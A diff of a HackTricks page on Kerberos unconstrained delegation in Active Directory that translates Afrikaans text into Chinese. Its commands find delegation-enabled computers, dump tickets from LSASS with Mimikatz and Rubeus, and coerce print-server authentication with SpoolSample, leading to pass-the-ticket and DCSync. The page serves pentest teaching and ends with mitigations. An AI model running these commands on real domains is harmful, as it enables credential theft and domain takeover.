@@ -1,79 +1,79 @@
 # Unconstrained Delegation
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
 ## Unconstrained delegation
 
-Dit is 'n kenmerk wat 'n Domein Administrateur kan stel op enige **Rekenaar** binne die domein. Dan, wanneer 'n **gebruiker aanmeld** op die Rekenaar, sal 'n **kopie van die TGT** van daardie gebruiker **binne die TGS** wat deur die DC **gestuur word en in geheue in LSASS gestoor word**. So, as jy Administrateur regte op die masjien het, sal jy in staat wees om die **kaartjies te dump en die gebruikers te verpersoonlik** op enige masjien.
+这是一个域管理员可以设置在域内任何 **计算机** 上的功能。然后，每当 **用户登录** 到该计算机时，该用户的 **TGT 副本** 将会被 **发送到 DC 提供的 TGS 中** **并保存在 LSASS 的内存中**。因此，如果您在该机器上拥有管理员权限，您将能够 **转储票证并冒充用户** 在任何机器上。
 
-So as 'n domein admin aanmeld op 'n Rekenaar met die "Unconstrained Delegation" kenmerk geaktiveer, en jy het plaaslike admin regte op daardie masjien, sal jy in staat wees om die kaartjie te dump en die Domein Admin enige plek te verpersoonlik (domein privesc).
+因此，如果域管理员登录到启用了“无约束委派”功能的计算机，并且您在该机器上拥有本地管理员权限，您将能够转储票证并在任何地方冒充域管理员（域权限提升）。
 
-Jy kan **Rekenaar objek met hierdie attribuut vind** deur te kyk of die [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) attribuut [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) bevat. Jy kan dit doen met 'n LDAP filter van ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, wat is wat powerview doen:
+您可以通过检查 [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) 属性是否包含 [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) 来 **查找具有此属性的计算机对象**。您可以使用 LDAP 过滤器 ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ 来执行此操作，这正是 powerview 所做的：
 
-<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
+<pre class="language-bash"><code class="lang-bash"># 列出无约束计算机
 ## Powerview
-Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
+Get-NetComputer -Unconstrained #DCs 总是出现，但对权限提升没有用
 <strong>## ADSearch
 </strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
-<strong># Export tickets with Mimikatz
+<strong># 使用 Mimikatz 导出票证
 </strong>privilege::debug
-sekurlsa::tickets /export #Recommended way
-kerberos::list /export #Another way
+sekurlsa::tickets /export #推荐方式
+kerberos::list /export #另一种方式
 
-# Monitor logins and export new tickets
-.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Check every 10s for new TGTs</code></pre>
+# 监控登录并导出新票证
+.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #每 10 秒检查一次新 TGT</code></pre>
 
-Laai die kaartjie van die Administrateur (of slagoffer gebruiker) in geheue met **Mimikatz** of **Rubeus vir 'n** [**Pass the Ticket**](pass-the-ticket.md)**.**\
-Meer inligting: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
-[**Meer inligting oor Unconstrained delegation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
+使用 **Mimikatz** 或 **Rubeus** 在内存中加载管理员（或受害者用户）的票证以进行 [**票证传递**](pass-the-ticket.md)**.**\
+更多信息：[https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
+[**关于无约束委派的更多信息在 ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
 
-### **Force Authentication**
+### **强制身份验证**
 
-As 'n aanvaller in staat is om 'n **rekenaar wat toegelaat word vir "Unconstrained Delegation"** te **kompromitteer**, kan hy 'n **Druk bediener** **mislei** om **outomaties aan te meld** teen dit **en 'n TGT in die geheue van die bediener te stoor**.\
-Dan kan die aanvaller 'n **Pass the Ticket aanval uitvoer om** die gebruiker se Druk bediener rekenaarrekening te verpersoonlik.
+如果攻击者能够 **攻陷一个允许“无约束委派”的计算机**，他可以 **欺骗** 一个 **打印服务器** 使其 **自动登录**，并 **在服务器的内存中保存 TGT**。\
+然后，攻击者可以执行 **票证传递攻击以冒充** 用户打印服务器计算机帐户。
 
-Om 'n druk bediener teen enige masjien aan te meld, kan jy [**SpoolSample**](https://github.com/leechristensen/SpoolSample) gebruik:
+要使打印服务器登录到任何机器，您可以使用 [**SpoolSample**](https://github.com/leechristensen/SpoolSample)：
 ```bash
 .\SpoolSample.exe <printmachine> <unconstrinedmachine>
 ```
-If the TGT if from a domain controller, you could perform a[ **DCSync attack**](acl-persistence-abuse/#dcsync) and obtain all the hashes from the DC.\
-[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
+如果 TGT 来自域控制器，您可以执行一个[ **DCSync 攻击**](acl-persistence-abuse/#dcsync)并从 DC 获取所有哈希。\
+[**有关此攻击的更多信息，请访问 ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
 
-**Hier is ander maniere om te probeer om 'n outentisering te dwing:**
+**以下是尝试强制身份验证的其他方法：**
 
 {% content-ref url="printers-spooler-service-abuse.md" %}
 [printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
 {% endcontent-ref %}
 
-### Mitigering
+### 缓解措施
 
-* Beperk DA/Admin aanmeldings tot spesifieke dienste
-* Stel "Rekening is sensitief en kan nie gedelegeer word nie" vir bevoorregte rekeninge.
+* 将 DA/Admin 登录限制为特定服务
+* 为特权账户设置“账户是敏感的，无法被委派”。
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
